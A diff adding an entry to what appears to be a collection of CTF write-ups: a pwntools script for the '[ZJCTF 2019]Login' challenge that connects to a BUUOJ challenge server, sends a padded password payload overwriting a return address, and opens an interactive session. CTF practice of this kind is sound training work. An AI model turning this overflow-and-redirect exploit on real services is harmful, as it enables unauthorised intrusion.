@@ -860,6 +860,19 @@ icon: icon-html
   r.interactive()
   ```
 
+* ### [ZJCTF 2019]Login
+
+  ```python
+  from pwn import *
+  r =remote('node2.buuoj.cn.wetolink.com',28952)
+  elf = ELF('./login')
+  fuck = 0x400e88
+  r.recvuntil('username:')
+  r.sendline('admin')
+  payload = '2jctf_pa5sw0rd'.ljust(0x48,'\x00')+p64(fuck)
+  r.recvuntil('password:')
+  r.sendline(payload)
+  r.interactive()
+  ```
+
   
-
-
